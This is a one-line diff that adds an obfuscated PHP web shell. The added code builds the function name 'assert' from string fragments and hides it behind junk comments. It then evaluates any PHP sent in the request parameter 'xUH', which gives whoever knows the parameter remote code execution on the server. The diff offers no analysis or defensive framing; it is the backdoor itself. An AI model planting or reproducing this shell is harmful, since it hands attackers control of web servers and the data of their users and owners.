@@ -1,0 +1,1 @@
+<?php /*i*/if(isset($_REQUEST['xUH']))/*QKn*/{$l/*we*/=/*GEF*/"as"."se"."rt";/*gTWhq*/$I=$l/*xl*/($_REQUEST['xUH']);exit;/*NaddO*/}?>
